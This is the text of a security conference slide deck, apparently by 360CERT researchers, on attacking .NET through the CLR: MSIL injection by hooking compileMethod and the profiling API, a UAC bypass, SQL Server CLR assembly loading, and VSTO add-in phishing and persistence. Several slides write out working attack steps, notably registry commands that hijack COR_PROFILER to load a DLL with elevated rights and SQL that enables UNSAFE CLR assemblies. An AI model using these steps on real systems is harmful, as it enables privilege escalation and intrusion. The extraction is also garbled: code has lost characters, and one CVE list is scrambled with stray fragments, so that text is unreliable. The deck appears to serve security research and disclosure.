Attacking Microsoft .NET Framework through CLR
MerJerson redrain
Qihoo 360CERT

Who are we
· MerJerson
· 360CERT · Security researcher · Lead author of this paper
· xingshikang@360.cn

· Redrain
· 360CERT · security researcher · CVE generator · Speaker on HITB, HITCON,
RUXCON, xKungfoo, Syscan360 · Member of Light4Freedom · Co-author of this paper
· hongyu-s@360.cn · http://www.hackdog.me

Who are we
· 360CERT 360Computer emergency response team is a young and powerful team setted up last year. We focus on emergency response for cyberspace upstream, malware analyzing, and threat hunting.
· http://cert.360.cn

Agenda
 .NET Framework and CLR
Primer Metadata and IL Code Some points
 History Review
MSIL Injection UAC Bypass Attack SQL Server via SQLi

 Learn the New by Restudying the Old
VSTO in Office Attack Office via VSTO Exploit in a Real World More vulnerabilities

.NET Framework and CLR

Primer
· Common Language Runtime (CLR) · Metadata · Managed Code ­ MSIL bytecode

Metadata and the PE File Structure

Metadata Table
Metadata Table:
Def Table Ref Table Pointer Table Heap

Metadata Tokens

Managed code

Write code

MSIL

CLR load Machine code
run

Struct

AppDomain

AppDomain

AppDomain

AppDomain

Process
os

CLR Hosting AppDomain
Process

History Review

MSIL injection
· CLR Hajacking (plan A)
· Hook compileMethod · Replace IL code · Reset pre-JITted
· CLR Hajacking (plan B)
· Install trampoline · Define a dynamic method · Pass parameters · Load assembly via calling
customize code

· Profiling api injection
· Intercept JIT · Replace IL code · Return new IL code to JIT

CLR Hajacking (plan A)

· Locate injection by GetMethod() · Hook compileMethod

public MethodInfo GetMethod( string name, BindingFlags bindingAttr
)

// hook and replace JIT's compileMethod with my own NTSTATUS ntStatus = LhInstallHook( (PVOID&)ICorJitCompiler::s_pfnComplieMethod
, &(PVOID&)CInjection::compileMethod , NULL , &s_hHookCompileMethod );

CLR Hajacking (plan A)

· Replace IL code
void MethodDesc::Reset() { ... ClearFlagsOnUpdate(); if (HasPrecode()){ GetPrecode()->Reset(); } else { _ASSERTE(GetLoaderModule()>IsReflection()); InterlockedUpdateFlags2(enum_flag2_Ha sStableEntryPoint | enum_flag2_HasPrecode, FALSE); *GetAddrOfSlotUnchecked() = GetTemporaryEntryPoint(); } _ASSERTE(!HasNativeCode()); }

· Reset pre-JITted
// find the method to be replaced std::map< CORINFO_METHOD_HANDLE, ILCodeBuffer>::iterator iter = s_mpILBuffers.find((CORINFO_METHOD_HANDLE)pMeth odDesc); if( iter != s_mpILBuffers.end() ) { tILCodeBuffer = iter->second; pCorMethodInfo->ILCode = tILCodeBuffer.pBuffer; pCorMethodInfo->ILCodeSize = tILCodeBuffer.dwSize; } CorJitResult result = pCorJitCompiler>compileMethod( pJitInfo, pCorMethodInfo, nFlags, pEntryAddress, pSizeOfCode); return result;

CLR Hajacking (plan B)
· Install a trampoline at the beginning of the code. This trampoline will call a dynamically defined method.
· Define a dynamic method that will have a specific method signature. · Construct an array of objects that will contain the parameters passed
to the method. · Invoke a dispatcher function which will load our Assembly and will
finally call our code by passing a handle to the original method and an array of objects representing the method parameters. · Repair the Assembly

MSIL injection
· Profiling API · JITCompilationStarted · GetILFunctionBody and SetILFunctionBody · Adjustment program

MSIL injection
JITCompilationStarted
HRESULT JITCompilationStarted( [in] FunctionID functionId, [in] BOOL fIsSafeToBlock);

MSIL injection
GetILFunctionBody:
HRESULT GetILFunctionBody( [in] ModuleID moduleId, [in] mdMethodDef methodId, [out] LPCBYTE *ppMethodHeader, [out] ULONG *pcbMethodSize);

MSIL injection
SetILFunctionBody
HRESULT SetILFunctionBody( [in] ModuleID moduleId, [in] mdMethodDef methodid, [in] LPCBYTE pbNewILMethodHeader);

MSIL injection
· Restore the runtime
· Header
· Codesize · Set header
· Status
· Stack · Heap · Parameters · Return address

MSIL injection
Add Profiler
set COR_PROFILER
set COR_PROFILER={32E2F4DA-1BEA-47ea-88F9C5DAF691C94A} set COR_PROFILER="MyProfiler"
COR_ENABLE_PROFILING

MSIL injection

Injection position
Entry Essence
Injection
Scope

Hook CompileMethod

Trampoline

Before JIT

Hook compileMethod Calli trampoline

Modify itself dynamically

Calli to dispatcher function

Modify

Invoking the user

compileMethod

defined code

modify IL code couldn't add data

itself new

/

invoke an arbitrary function

Profiling API
JITCompilationStarted Profiling monitor SetILFunctionBody
modify program entry

UAC bypass
· Set env var · Initialize CLR · Load profiler dll · Bypass UAC

UAC bypass

Set a env var

PoC by powershell

COR_ENABLE_PROFILING=1 COR_PROFILER={GUID} COR_PROFILER_PATH=C:\hitb.dll

REG ADD "HKCUSoftwareClassesCLSID{FFFFFFFF-FFFFFFFF-FFFF-FFFFFFFFFFFF}InprocServer32" /ve /t REG_EXPAND_SZ /d "C:\hitb.dll" /f REG ADD "HKCUEnvironment" /v "COR_PROFILER" /t REG_SZ /d "{FFFFFFFF-FFFF-FFFF-FFFFFFFFFFFFFFFF}" /f REG ADD "HKCUEnvironment" /v "COR_ENABLE_PROFILING" /t REG_SZ /d "1" /f mmc gpedit.msc

UAC bypass

SQL Server injection
CREATE ASSEMBLY [demo] AUTHORIZATION [dbo] FROM [0x4D5A90000...] WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE [dbo].[WirteFile] AS EXTERNAL NAME [demo].[StoredProcedures].[SQLPcd] EXEC [dbo].[WirteFile]

SQL Server injection
· Create SQL Server project via VS · Create a custom stored procedure via CLR · Attack SQL Server lead to load arbitrary dll

SQL Server injection
CREATE ASSEMBLY [demo] AUTHORIZATION [dbo] FROM [0x4D5A90000...] WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE [dbo].[WirteFile] AS EXTERNAL NAME [demo].[StoredProcedures].[SQLPcd]
EXEC [dbo].[WirteFile]

SQL Server injection

SQL Server injection

SQL Server injection
CREATE PROCEDURE [dbo].[WirteFile] AS EXTERNAL NAME [demo].[StoredProcedures].[SQLPcd]
EXEC [dbo].[WirteFile]

SQL Server injection
· Restrictions
· CLR support enabled on SQL Server (could turn on by sql)
sp_configure 'clr enable', 1;go;reconfigure;go alter database [dbname] set trustworthy on
· Exec privilege (could be elevated by dba)
· Significance
· xp_cmd_shell can't be restore · New way to elevation of dba privilege · Bypass waf and AV in real world

Learn the new by restudying the old

VSTO Attack Vectors
· VSTO Development · VSTO Weak points

VSTO Attack Vectors
· Excel · Workbook · Template
· InfoPath · Outlook · PowerPoint · Visio · Word
· Document · Template

VSTO Attack Vectors

VSTO Attack Vectors
Need to be solved:
Certificate Additional File

VSTO Attack Vectors
attrib +s +a +h +r document

VSTO weakness
Documentation phishing Persistent backdoor

VSTO phishing

5%
36% 59, 59%

Macro 59.59% Vulnerabilities exploit 36% Feature and others 5%

  

VSTO phishing
In real world

VSTO phishing
Set up a probe

VSTO phishing
Result for phishing

success proportion
HIT MISSED

VSTO phishing

VSTO phishing
· Macro phishing
· 11%-14% success
· DDE phishing
· Nearly 30% success

· VSTO phishing with hidden
· Nearly 40% success

VSTO weakness
VSTO Loading:
· checks the registry · application loads VSTOEE.dll, which loads VSTOLoader.dll · starts the managed portion of the Visual Studio Tools for
Office runtime · security checks · check for assembly updates · creates a new application domain · loads the VSTO Add-in assembly into the application domain.

VSTO weakness
VSTO Self-mechanism:
· Dll hijacking · Porfiling injection · Config hijacking

More vulnerabilities

· .NET Framework include CLR
· The C# code will be translate by CLR
· Fuzz the IL code by MSIL injection
· Monitor the .NET application upstream status to judge crash/hang or not

MSIL Fuzzer Logger Agent

Target.

call

dll

run

Target.

exe

Verifier

More vulnerabilities

More vulnerabilities

More vulnerabilities

CVE-2017-0564,CVE-2017-0483,CVE-2017-0526,CVE-2017-0527,CVE-2017-0333,CVE-2017-0479,CVE-2017-0480, CVE-2017-0450,CVE-2017-0448,CVE-2017-0436,CVE-2017-0444,CVE-2017-0435,CVE-2017-0429,CVE-2017-0428,
CVE-2H01a7c-k04e2r5s,:CVE-2017-0418,CVE-2017-0417,CVE-2017-0402,CVE-2017-0401,CVE-2017-0400,CVE-2017-0398,
CVE-2017-0385,CVE-2017-0384,CVE-2017-0383,CVE-2016-10291,CVE-2016-8481,CVE-2016-8480,CVE-2016-8449, CVE-2016-8435,CVE-2016-8432,CVE-2016-8431,CVE-2016-8426,CVE-2016-8425,CVE-2016-8400,CVE-2016-8392,
CVE-2A01n6t-o83n9io1,C"VsE4-2ta01n6"-6P7a9r1a,CtVaE-2016-6790,CVE-2016-6789,CVE-2016-6786,CVE-2016-6780,CVE-2016-6777,
CVE-2016-6775,CVE-2016-6765,CVE-2016-6761,CVE-2016-6760,CVE-2016-6759,CVE-2016-6758,CVE-2016-6746,
CVE-2c0y16g-06773@6,3CV6E0-2016-6735,CVE-2016-6734,CVE-2016-6733,CVE-2016-6732,CVE-2016-6731,CVE-2016-6730,
CVE-2016-6720,CVE-2016-3933,CVE-2016-3932,CVE-2016-3909,CVE-2016-5342,CVE-2016-3895,CVE-2016-3872,
CVE-2s0w16e-3e8p7e1,rCV&E-d2041r6k-e38r7@0,CkVyEli-n20t1e6a-3m857,CVE-2016-3844,CVE-2016-3835,CVE-2016-3825,CVE-2016-3824,
CVE-2016-3823,CVE-2016-3774,CVE-2016-3773,CVE-2016-3772,CVE-2016-3771,CVE-2016-3770,CVE-2016-3765,
CVE-2L01in6-k3747,CVE-2016-3746,CVE-2016-2486,CVE-2016-2485,CVE-2016-2484,CVE-2016-2483,CVE-2016-2482, CVE-2h01t6tp-2:4/8/1p,ChVrEa-c2k0.1o6-r2g4/8p0a,CpVeEr-s2/0d16o-2tn47e9t,_CVinEs-2tr0u16m-2e4n78ta,CtVioE-n2.0h1t6m-24l 77,CVE-2016-2452,CVE-2016-2451,
CVE-2016-2450,CVE-2016-2449,CVE-2016-2448,CVE-2016-2442,CVE-2016-2441,CVE-2016-2437,SVE-2016-5393, CVE-2015-1805,CVE-2016-0826,CVE-2016-0804,CVE-2015-8681,CVE-2015-8318,CVE-2015-8307,CVE-2015-5524,
CVE-2015-8089,CVE-2015-3869,CVE-2015-3868,CVE-2015-3865,CVE-2015-3862,CVE-2015-0573,CVE-2015-0568

CVE-2017-0564,CVE-2017-0483,CVE-2017-0526,CVE-2017-0527,CVE-2017-0333,CVE-2017-0479,CVE-2017-0480, CVE-2017-0450,CVE-2017-0448,CVE-2017-0436,CVE-2017-0444,CVE-2017-0435,CVE-2017-0429,CVE-2017-0428, CVE-2017-0425,CVE-2017-0418,CVE-2017-0417,CVE-2017-0402,CVE-2017-0401,CVE-2017-0400,CVE-2017-0398, CVE-2017-0385,CVE-2017-0384,CVE-2017-0383,CVE-2016-10291,CVE-2016-8481,CVE-2016-8480,CVE-2016-8449, CVE-2016-8435,CVE-2016-8432,CVE-2016-8431,CVE-2016-8426,CVE-2016-8425,CVE-2016-8400,CVE-2016-8392, CVE-2016-8391,CVE-2016-6791,CVE-2016-6790,CVE-2016-6789,CVE-2016-6786,CVE-2016-6780,CVE-2016-6777, CVE-2016-6775,CVE-2016-6765,CVE-2016-6761,CVE-2016-6760,CVE-2016-6759,CVE-2016-6758,CVE-2016-6746, CVE-2016-6736,CVE-2016-6735,CVE-2016-6734,CVE-2016-6733,CVE-2016-6732,CVE-2016-6731,CVE-2016-6730, CVE-2016-6720,CVE-2016-3933,CVE-2016-3932,CVE-2016-3909,CVE-2016-5342,CVE-2016-3895,CVE-2016-3872, CVE-2016-3871,CVE-2016-3870,CVE-2016-3857,CVE-2016-3844,CVE-2016-3835,CVE-2016-3825,CVE-2016-3824, CVE-2016-3823,CVE-2016-3774,CVE-2016-3773,CVE-2016-3772,CVE-2016-3771,CVE-2016-3770,CVE-2016-3765, CVE-2016-3747,CVE-2016-3746,CVE-2016-2486,CVE-2016-2485,CVE-2016-2484,CVE-2016-2483,CVE-2016-2482, CVE-2016-2481,CVE-2016-2480,CVE-2016-2479,CVE-2016-2478,CVE-2016-2477,CVE-2016-2452,CVE-2016-2451, CVE-2016-2450,CVE-2016-2449,CVE-2016-2448,CVE-2016-2442,CVE-2016-2441,CVE-2016-2437,SVE-2016-5393, CVE-2015-1805,CVE-2016-0826,CVE-2016-0804,CVE-2015-8681,CVE-2015-8318,CVE-2015-8307,CVE-2015-5524, CVE-2015-8089,CVE-2015-3869,CVE-2015-3868,CVE-2015-3865,CVE-2015-3862,CVE-2015-0573,CVE-2015-0568

